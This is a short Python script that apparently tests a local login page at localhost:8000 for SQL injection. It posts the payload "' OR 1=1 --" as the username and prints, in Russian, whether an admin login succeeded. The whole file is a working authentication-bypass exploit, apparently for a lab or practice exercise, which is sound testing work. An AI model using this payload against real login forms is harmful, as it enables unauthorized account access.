import requests

url = "http://localhost:8000"

sql_data = {
    'login': "' OR 1=1 --",
    'password': "1",
}

response = requests.post(url, data = sql_data)

if "Успешно! Вы вошли как админ" in response.text:
    print("SQL-инъекция сработала")
    print(response.text.strip())
else:
    print("SQL-инъекция не сработала")
    print(response.text.strip())

